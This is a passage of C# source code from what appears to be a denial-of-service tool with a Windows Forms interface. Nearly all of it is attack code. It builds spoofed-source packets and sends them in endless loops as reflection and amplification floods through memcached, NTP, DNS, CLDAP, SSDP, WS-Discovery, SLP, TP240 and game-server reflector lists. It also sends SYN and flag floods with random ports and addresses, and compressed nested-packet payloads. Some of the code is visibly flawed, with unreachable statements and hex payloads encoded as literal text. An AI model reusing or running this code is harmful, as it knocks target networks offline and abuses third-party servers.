            t1.PayloadData = nape;
            t2.PayloadData = nape;
            t3.PayloadData = nape;
            byte[] bomb = CompressionFactory.GZip.Compress(zl, 9);
            while (true)
            {
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
                dev.SendPacket(bomb);
            }
        }
        private void src(IPAddress ipa, IPPacket ip, byte[] sd, EthernetPacket ep, UdpPacket udp, string[] sourceservers)
        {
            Random r = new Random();
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 27005;
            udp.DestinationPort = 27015;
            udp.PayloadData = sd;
            while (true)
            {
                foreach (string f in sourceservers)
                {
                    if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        ip6.SourceAddress = ipa;
                        ip6.DestinationAddress = IPAddress.Parse(f);
                    }
                    ip.DestinationAddress = IPAddress.Parse(f);
                    ip.SourceAddress = ipa;

                    dev.SendPacket(ep.Bytes);
                    if (checkBox2.Checked)
                    {
                        udp.SourcePort = (ushort)new Random().Next(65535);
                    }
                }
            }
        }
        private Random r = new Random();
        private void mem(IPAddress ipa, IPPacket ip, byte[] memd, EthernetPacket ep, UdpPacket udp, string[] memservers)
        {
            Random r = new Random();
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 11211;
            udp.DestinationPort = 11211;
            udp.PayloadData = memd;

            while (true)
            {
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    ip6.SourceAddress = ipa;
                    ip6.DestinationAddress = IPAddress.Parse(memservers[r.Next(memservers.Length)]);
                }
                ip.DestinationAddress = IPAddress.Parse(memservers[r.Next(memservers.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void dns(IPAddress ipa, IPPacket ip, byte[] dnsd, EthernetPacket ep, UdpPacket udp, string[] dnsservers)
        {
            udp.SourcePort = 53;
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.DestinationPort = 53;
            udp.PayloadData = dnsd;
            while (true)
            {
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    ip6.SourceAddress = ipa;
                    ip6.DestinationAddress = IPAddress.Parse(dnsservers[r.Next(dnsservers.Length)]);
                }
                ip.DestinationAddress = IPAddress.Parse(dnsservers[r.Next(dnsservers.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void ntp(IPAddress ipa, IPPacket ip, byte[] ntpd, EthernetPacket ep, UdpPacket udp, string[] ntpservers)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 123;
            udp.DestinationPort = 123;
            udp.PayloadData = ntpd;
            while (true)
            {
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    ip6.SourceAddress = ipa;
                    ip6.DestinationAddress = IPAddress.Parse(ntpservers[r.Next(ntpservers.Length)]);
                }
                ip.DestinationAddress = IPAddress.Parse(ntpservers[r.Next(ntpservers.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void wsd(IPAddress ipa, IPPacket ip, byte[] wsdd, EthernetPacket ep, UdpPacket udp, string[] wreflect)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 3702;
            udp.DestinationPort = 3702;
            udp.PayloadData = wsdd;
            while (true)
            {
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    ip6.SourceAddress = ipa;
                    ip6.DestinationAddress = IPAddress.Parse(wreflect[r.Next(wreflect.Length)]);
                }
                ip.DestinationAddress = IPAddress.Parse(wreflect[r.Next(wreflect.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void cldap(IPAddress ipa, IPPacket ip, byte[] cldapd, EthernetPacket ep, UdpPacket udp, string[] cldapservers)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 389;
            udp.DestinationPort = 389;
            udp.PayloadData = cldapd;
            while (true)
            {
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    ip6.SourceAddress = ipa;
                    ip6.DestinationAddress = IPAddress.Parse(cldapservers[r.Next(cldapservers.Length)]);
                }
                ip.DestinationAddress = IPAddress.Parse(cldapservers[r.Next(cldapservers.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void gmod(IPAddress ipa, IPPacket ip, ushort dport, byte[] sd, EthernetPacket ep, UdpPacket udp, string[] sourceservers)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 27005;
            udp.DestinationPort = dport;
            udp.PayloadData = Encoding.ASCII.GetBytes(@"ffffffff54536f7572636520456e67696e6520517565727900");
            while (true)
            {
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    udp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
            }
        }
        private void ud(IPAddress ipa, IPPacket ip, ushort sport, ushort dport, byte[] sd, EthernetPacket ep, UdpPacket udp)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = sport;
            udp.DestinationPort = dport;
            udp.PayloadData = sd;
            while (true)
            {
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    udp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
            }
        }
        private void tc(IPAddress ipa, IPPacket ip, ushort sport, ushort dport, byte[] sd, EthernetPacket ep, TcpPacket tcp)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            tcp.SourcePort = sport;
            tcp.DestinationPort = dport;
            tcp.PayloadData = sd;
            if (checkBox4.Checked)
            {
                tcp.Synchronize = true;
            }
            if (checkBox5.Checked)
            {
                tcp.Acknowledgment = true;
            }
            if (checkBox6.Checked)
            {
                tcp.Finished = true;
            }
            if (checkBox7.Checked)
            {
                tcp.Reset = true;
            }
            if (checkBox8.Checked)
            {
                tcp.Urgent = true;
            }
            if (checkBox9.Checked)
            {
                tcp.Push = true;
            }
            if (checkBox10.Checked)
            {
                tcp.ExplicitCongestionNotificationEcho = true;
            }
            if (checkBox11.Checked)
            {
                tcp.CongestionWindowReduced = true;
            }
            if (checkBox12.Checked)
            {
                tcp.Synchronize = true;
                tcp.Acknowledgment = true;
                tcp.Finished = true;
                tcp.Reset = true;
                tcp.Urgent = true;
                tcp.Push = true;
                tcp.ExplicitCongestionNotificationEcho = true;
                tcp.CongestionWindowReduced = true;
            }
            while (true)
            {
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
            }
        }
        private void sf(IPAddress ipa, IPPacket ip, ushort sport, ushort dport, byte[] sd, EthernetPacket ep, TcpPacket tcp)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            tcp.SourcePort = sport;
            tcp.DestinationPort = dport;
            tcp.Synchronize = true;
            tcp.PayloadData = sd;
            if (checkBox4.Checked)
            {
                tcp.Synchronize = true;
            }
            if (checkBox5.Checked)
            {
                tcp.Acknowledgment = true;
            }
            if (checkBox6.Checked)
            {
                tcp.Finished = true;
            }
            if (checkBox7.Checked)
            {
                tcp.Reset = true;
            }
            if (checkBox8.Checked)
            {
                tcp.Urgent = true;
            }
            if (checkBox9.Checked)
            {
                tcp.Push = true;
            }
            if (checkBox10.Checked)
            {
                tcp.ExplicitCongestionNotificationEcho = true;
            }
            if (checkBox11.Checked)
            {
                tcp.CongestionWindowReduced = true;
            }
            if (checkBox12.Checked)
            {
                tcp.Synchronize = true;
                tcp.Acknowledgment = true;
                tcp.Finished = true;
                tcp.Reset = true;
                tcp.Urgent = true;
                tcp.Push = true;
                tcp.ExplicitCongestionNotificationEcho = true;
                tcp.CongestionWindowReduced = true;
            }
            while (true)
            {
                dev.SendPacket(ep.Bytes);
            }
            if (checkBox2.Checked)
            {
                tcp.SourcePort = (ushort)new Random().Next(65535);
            }
            if (rp.Checked)
            {
                tcp.DestinationPort = (ushort)new Random().Next(65535);
            }
            if (rip.Checked)
            {
                ip.SourceAddress = randip();
            }
        }
        private void ssdp(IPAddress ipa, IPPacket ip, byte[] ssdpd, EthernetPacket ep, UdpPacket udp, string[] ssdpreflect)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 1900;
            udp.DestinationPort = 1900;
            udp.PayloadData = ssdpd;
            while (true)
            {
                if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    ip6.DestinationAddress = IPAddress.Parse(ssdpreflect[r.Next(ssdpreflect.Length)]);
                }
                ip.DestinationAddress = IPAddress.Parse(ssdpreflect[r.Next(ssdpreflect.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void willypete(IPAddress ipa, ushort sport, ushort dport, int size, int nsize, ushort ttl, string msg)
        {
            dev.Open();
            IPAddress sp = IPAddress.Parse(spoofbox.Text);
            IPEndPoint ipe = new IPEndPoint(ipa, dport);
            EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(sp, ipa);
            IPv6Packet ip6 = new IPv6Packet(sp, ipa);
            ip.TimeToLive = ttl;
            ip6.TimeToLive = ttl;
            ushort soport = ushort.Parse(sport.ToString());
            ushort deport = ushort.Parse(dport.ToString());
            var tcp = new TcpPacket(soport, deport);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = tcp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = tcp;
                ep.PayloadPacket = ip6;
            }
            var t1 = new TcpPacket(soport, deport);
            var t2 = new TcpPacket(soport, deport);
            var t3 = new TcpPacket(soport, deport);
            var t4 = new TcpPacket(soport, deport);
            var t5 = new TcpPacket(soport, deport);
            var t6 = new TcpPacket(soport, deport);
            tcp.Synchronize = true;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            t5.PayloadPacket = t6;
            t4.PayloadPacket = t5;
            t2.PayloadPacket = t3;
            t1.PayloadPacket = t2;
            tcp.PayloadPacket = t1;
            byte[] p4 = ep.Bytes;
            Stream s = new MemoryStream(p4);
            byte[] gz = CompressionFactory.Lzma.Compress(s, 9);
            byte[] zl = CompressionFactory.Zlib.Compress(gz, 9);
            while (true)
            {
                dev.SendPacket(zl);
            }
        }
        private void slp(IPAddress ipa, IPPacket ip, EthernetPacket ep, UdpPacket udp, string[] slpreflect)
        {
            IPv6Packet ip6 = new IPv6Packet(ipa, randipv6());
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 427;
            udp.DestinationPort = 427;
            udp.PayloadData = Encoding.ASCII.GetBytes(@"\x02\t\x00\x00\x1d\x00\x00\x00\x00\x00s_\x00\x02en\x00\x00\xff\xff\x00\x07default");
            while (true)
            {
                ip6.DestinationAddress = IPAddress.Parse(slpreflect[r.Next(slpreflect.Length)]);
                ip.DestinationAddress = IPAddress.Parse(slpreflect[r.Next(slpreflect.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void tp240(IPAddress ipa, IPPacket ip, EthernetPacket ep, UdpPacket udp, string[] tpreflect)
        {
            IPv6Packet ip6 = new IPv6Packet(randipv6(), ipa);
            if (ipa.AddressFamily == AddressFamily.InterNetwork)
            {
                ip.PayloadPacket = udp;
                ep.PayloadPacket = ip;
            }
            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
            {
                ip6.PayloadPacket = udp;
                ep.PayloadPacket = ip6;
            }
            udp.SourcePort = 10074;
            udp.DestinationPort = 10074;
            udp.PayloadData = Encoding.ASCII.GetBytes(@"\x63\x61\x6c\x6c\x2e\x73\x74\x61\x72\x74\x62\x6c\x61\x73\x74\x20\x32\x30\x30\x30\x20\x33\x00");
            while (true)
            {
                ip.DestinationAddress = IPAddress.Parse(tpreflect[r.Next(tpreflect.Length)]);
                ip.SourceAddress = ipa;
                dev.SendPacket(ep.Bytes);
                if (checkBox2.Checked)
                {
                    udp.SourcePort = (ushort)new Random().Next(65535);
                }
            }
        }
        private void ps24v4(IPAddress ipa, ushort sport, ushort dport, string[] dnsservers)
        {
            Random r = new Random();
            EthernetPacket ep = new EthernetPacket(dev.MacAddress, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv4Packet ip = new IPv4Packet(randip(), ipa);
            ip.Protocol = PacketDotNet.ProtocolType.Icmp;
            TcpPacket tcp = new TcpPacket(sport, dport);
            IPAddress target = randip();
            IPv4Packet theip = new IPv4Packet(ipa, target);
            IPv4Packet theip1 = new IPv4Packet(target, ipa);
            IPv4Packet theip2 = new IPv4Packet(ipa, target);
            var thermo1 = new TcpPacket(sport, dport);
            var thermo2 = new TcpPacket(dport, sport);
            var thermo3 = new TcpPacket(sport, dport);
            thermo1.Synchronize = true;
            thermo2.Synchronize = true;
            thermo2.Acknowledgment = true;
            thermo3.Acknowledgment = true;
            var t1 = new TcpPacket(sport, dport);
            var t2 = new TcpPacket(sport, dport);
            var t3 = new TcpPacket(sport, dport);
            var t4 = new TcpPacket(sport, dport);
            var t5 = new TcpPacket(sport, dport);
            var t6 = new TcpPacket(sport, dport);
            var t = new TcpPacket(sport, dport);
            t.Synchronize = true;
            var t9 = new TcpPacket(sport, dport);
            t9.Synchronize = true;
            var t7 = new TcpPacket(sport, dport);
            t7.Synchronize = true;
            var t8 = new TcpPacket(sport, dport);
            t8.Synchronize = true;
            tcp.Synchronize = true;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            IPv4Packet ip2 = new IPv4Packet(ipa, IPAddress.Parse(dnsservers[r.Next(dnsservers.Length)]));
            UdpPacket udp = new UdpPacket((ushort)r.Next(49152, 65535), 53);
            IcmpV4Packet icmp = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(new byte[16]));
            IPv4Packet ip3 = new IPv4Packet(ipa, randip());
            IPv4Packet ip4 = new IPv4Packet(ipa, randip());
            icmp.TypeCode = IcmpV4TypeCode.MobileReqistrationRequest;
            tcp.UrgentPointer = 90;
            tcp.PayloadData = tcp.Bytes;
            t1.PayloadData = tcp.Bytes;
            t2.PayloadData = tcp.Bytes;
            tcp.Urgent = true;
            tcp.Push = true;
            ep.PayloadPacket = ip;
            ip.PayloadPacket = tcp;
            tcp.PayloadPacket = t;
            t.PayloadPacket = t1;
            t1.PayloadPacket = t2;
            t2.PayloadPacket = t3;
            t3.PayloadPacket = t4;
            t4.PayloadPacket = t5;
            t5.PayloadPacket = t6;
            t6.PayloadPacket = t7;
            t7.PayloadPacket = t8;
            t8.PayloadPacket = ip2;
            ip2.PayloadPacket = udp;
            udp.PayloadPacket = ip3;
            ip3.PayloadPacket = icmp;
            icmp.PayloadPacket = ip4;
            ip4.PayloadPacket = icmp;
            icmp.PayloadPacket = theip;
            theip.PayloadPacket = thermo1;
            thermo1.PayloadPacket = theip1;
            theip1.PayloadPacket = thermo2;
            thermo2.PayloadPacket = theip2;
            theip2.PayloadPacket = thermo3;
            while (true)
            {
                dev.SendPacket(ep.Bytes);
                target = randip();
                theip.DestinationAddress = target;
                theip1.SourceAddress = target;
                theip2.DestinationAddress = target;
                if (checkBox2.Checked)
                {
                    tcp.SourcePort = (ushort)new Random().Next(65535);
                }
                if (rp.Checked)
                {
                    tcp.DestinationPort = (ushort)new Random().Next(65535);
                }
                if (rip.Checked)
                {
                    ip.SourceAddress = randip();
                }
            }
        }
        private void ps24v6(IPAddress ipa, ushort sport, ushort dport, string[] dnsservers)
        {
            Random r = new Random();
            EthernetPacket ep = new EthernetPacket(dev.MacAddress, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
            IPv6Packet ip = new IPv6Packet(randipv6(), ipa);
            ip.Protocol = PacketDotNet.ProtocolType.Icmp;
            TcpPacket tcp = new TcpPacket(sport, dport);
            IPAddress target = randipv6();
            IPv6Packet theip = new IPv6Packet(ipa, target);
            IPv6Packet theip1 = new IPv6Packet(target, ipa);
            IPv6Packet theip2 = new IPv6Packet(ipa, target);
            var thermo1 = new TcpPacket(sport, dport);
            var thermo2 = new TcpPacket(dport, sport);
            var thermo3 = new TcpPacket(sport, dport);
            thermo1.Synchronize = true;
            thermo2.Synchronize = true;
            thermo2.Acknowledgment = true;
            thermo3.Acknowledgment = true;
            var t1 = new TcpPacket(sport, dport);
            var t2 = new TcpPacket(sport, dport);
            var t3 = new TcpPacket(sport, dport);
            var t4 = new TcpPacket(sport, dport);
            var t5 = new TcpPacket(sport, dport);
            var t6 = new TcpPacket(sport, dport);
            var t = new TcpPacket(sport, dport);
            t.Synchronize = true;
            var t9 = new TcpPacket(sport, dport);
            t9.Synchronize = true;
            var t7 = new TcpPacket(sport, dport);
            t7.Synchronize = true;
            var t8 = new TcpPacket(sport, dport);
            t8.Synchronize = true;
            tcp.Synchronize = true;
            t1.Synchronize = true; t2.Synchronize = true;
            t3.Synchronize = true; t4.Synchronize = true;
            t5.Synchronize = true; t6.Synchronize = true;
            IPv6Packet ip2 = new IPv6Packet(ipa, IPAddress.Parse(dnsservers[r.Next(dnsservers.Length)]));
            UdpPacket udp = new UdpPacket((ushort)r.Next(49152, 65535), 53);
            IcmpV6Packet icmp = new IcmpV6Packet(new PacketDotNet.Utils.ByteArraySegment(new byte[16]));
            IPv6Packet ip3 = new IPv6Packet(ipa, randipv6());
            IPv6Packet ip4 = new IPv6Packet(ipa, randipv6());
            icmp.Type = IcmpV6Type.ExtendedEchoRequest;
            tcp.UrgentPointer = 90;
            tcp.PayloadData = tcp.Bytes;
            t1.PayloadData = tcp.Bytes;
            t2.PayloadData = tcp.Bytes;
            tcp.Urgent = true;
            tcp.Push = true;
            ep.PayloadPacket = ip;
            ip.PayloadPacket = tcp;
            tcp.PayloadPacket = t;
            t.PayloadPacket = t1;
            t1.PayloadPacket = t2;
            t2.PayloadPacket = t3;
            t3.PayloadPacket = t4;
            t4.PayloadPacket = t5;
            t5.PayloadPacket = t6;
            t6.PayloadPacket = t7;
            t7.PayloadPacket = t8;
            t8.PayloadPacket = ip2;
            ip2.PayloadPacket = udp;
            udp.PayloadPacket = ip3;
            ip3.PayloadPacket = icmp;
            icmp.PayloadPacket = ip4;
            ip4.PayloadPacket = icmp;
            icmp.PayloadPacket = theip;
            theip.PayloadPacket = thermo1;
            thermo1.PayloadPacket = theip1;
            theip1.PayloadPacket = thermo2;
            thermo2.PayloadPacket = theip2;
            theip2.PayloadPacket = thermo3;
            while (true)
            {
                dev.SendPacket(ep.Bytes);
                target = randipv6();
                theip.DestinationAddress = target;
                theip1.SourceAddress = target;
                theip2.DestinationAddress = target;
            }
        }
        private async void button2_Click(object sender, EventArgs e)
        {
            try
            {
                IPAddress ipa = IPAddress.Parse(textBox1.Text);
                if (ipa.AddressFamily == AddressFamily.InterNetwork)
                {
                    dev.Open();
                    char quot = '"';
                    byte[] ntpd = Encoding.ASCII.GetBytes(@"\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00");
                    byte[] ssdpd = Encoding.ASCII.GetBytes(@$"M - SEARCH\\r\\nST: ssdp:all\\r\\nMAN:\\{quot}ssdp:discover{quot}\\n");
                    byte[] memd = Encoding.ASCII.GetBytes(@"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n");
                    byte[] dnsd = Encoding.ASCII.GetBytes(@"\\xff\\xff\\xff\\xff\\x54\\x53\\x6f\\x75\\x72\\x63\\x65\\x20\\x45\\x6e\\x67\\x69\\x6e\\x65\\x20\\x51\\x75\\x65\\x72\\x79\\x00");
                    byte[] sd = Encoding.ASCII.GetBytes(@"ffffffff54536f7572636520456e67696e6520517565727900");
                    byte[] cldapd = Encoding.ASCII.GetBytes(@"\\x30\\x25\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x00\\x0a\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0b\\x6f\\x62\\x6a\\x65\\x63\\x74\\x63\\x6c\\x61\\x73\\x73\\x30\\x00");
                    byte[] wsdd = Encoding.ASCII.GetBytes(@"<Envelope><Body><Probe></Probe></Body></Envelope>");
                    int sport = int.Parse(sportbox.Text);
                    int dport = int.Parse(dportbox.Text);
                    IPAddress sp = IPAddress.Parse(spoofbox.Text);
                    IPEndPoint ipe = new IPEndPoint(ipa, dport);
                    EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                    IPv4Packet ip = new IPv4Packet(sp, ipa);
                    IPv6Packet ip6 = new IPv6Packet(sp, ipa);
                    ushort soport = ushort.Parse(sport.ToString());
                    ushort deport = ushort.Parse(dport.ToString());
                    var tcp = new TcpPacket(soport, deport);
                    TcpClient tclient = new TcpClient();
                    var udp = new UdpPacket(soport, deport);
                    int size = int.Parse(sizebox.Text);
                    byte[] f = new byte[int.Parse(sizebox.Text)];
                    ushort ttl = ushort.Parse(ttlbox.Text);
                    string[] ntpservers = System.IO.File.ReadAllLines(@"ntpservers.txt");
                    string[] dnsservers = System.IO.File.ReadAllLines(@"dnsservers.txt");
                    string[] cldapservers = System.IO.File.ReadAllLines(@"cldapservers.txt");
                    string[] memservers = System.IO.File.ReadAllLines(@"memcachedservers.txt");
                    string[] slpservers = System.IO.File.ReadAllLines(@"slpreflectors.txt");
                    string[] sourceservers = System.IO.File.ReadAllLines(@"sourceservers.txt");
                    string[] wreflect = System.IO.File.ReadAllLines(@"wsdreflectors.txt");
                    string[] tp240reflect = System.IO.File.ReadAllLines(@"tp240reflectors.txt");
                    string[] ssdpreflect = System.IO.File.ReadAllLines(@"ssdpreflectors.txt");
                    if (ipa.AddressFamily == AddressFamily.InterNetwork)
                    {
                        if (comboBox1.SelectedIndex == 13 || comboBox1.SelectedIndex == 14 || comboBox1.SelectedIndex == 15 || comboBox1.SelectedIndex == 16 || comboBox1.SelectedIndex == 17 || comboBox1.SelectedIndex == 18 || comboBox1.SelectedIndex == 21 || comboBox1.SelectedIndex == 25 || comboBox1.SelectedIndex == 28)
                        {
                            ip.PayloadPacket = tcp;
                            ep.PayloadPacket = ip;
                        }
                        else if (comboBox1.SelectedIndex == 3 || comboBox1.SelectedIndex == 4 || comboBox1.SelectedIndex == 5 || comboBox1.SelectedIndex == 6 || comboBox1.SelectedIndex == 7 || comboBox1.SelectedIndex == 8 || comboBox1.SelectedIndex == 9 || comboBox1.SelectedIndex == 10 || comboBox1.SelectedIndex == 19 || comboBox1.SelectedIndex == 24)
                        {
                            ip.PayloadPacket = udp;
                            ep.PayloadPacket = ip;
                        }
                    }
                    if (comboBox1.SelectedIndex == 19)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            nape(ipa, soport, deport, f, ttl, textBox9.Text);
                        }
                    }
                    if (comboBox1.SelectedIndex == 15)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            ps(ipa, soport, deport, size, size, ttl, textBox9.Text);
                        }
                    }
                    if (comboBox1.SelectedIndex == 17)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            l2023(ipa, soport, deport, size, size, ttl, textBox9.Text);
                        }
                    }
                    if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetwork)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            vx4(dev);
                        }
                    }
                    if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        for (int i = 0; i < trackBar1.Value; i++)
                        {
                            vx6(dev);
                        }
                    }
                    switch (comboBox1.SelectedIndex)
                    {
                        case 3:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                mem(ipa, ip, memd, ep, udp, memservers);
                                ntp(ipa, ip, memd, ep, udp, ntpservers);
                                wsd(ipa, ip, memd, ep, udp, wreflect);
                                dns(ipa, ip, memd, ep, udp, dnsservers);
                                cldap(ipa, ip, memd, ep, udp, cldapservers);
                                ssdp(ipa, ip, memd, ep, udp, ssdpreflect);
                                src(ipa, ip, memd, ep, udp, sourceservers);
                            }
                            break;
                        case 6:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                mem(ipa, ip, memd, ep, udp, memservers);
                            }
                            break;
                        case 7:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ntp(ipa, ip, ntpd, ep, udp, ntpservers);
                            }
                            break;
                        case 8:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                wsd(ipa, ip, wsdd, ep, udp, wreflect);
                            }
                            break;
                        case 9:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                dns(ipa, ip, dnsd, ep, udp, dnsservers);
                            }
                            break;
                        case 10:
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                cldap(ipa, ip, cldapd, ep, udp, cldapservers);
                            }
                            break;
                        case 11:
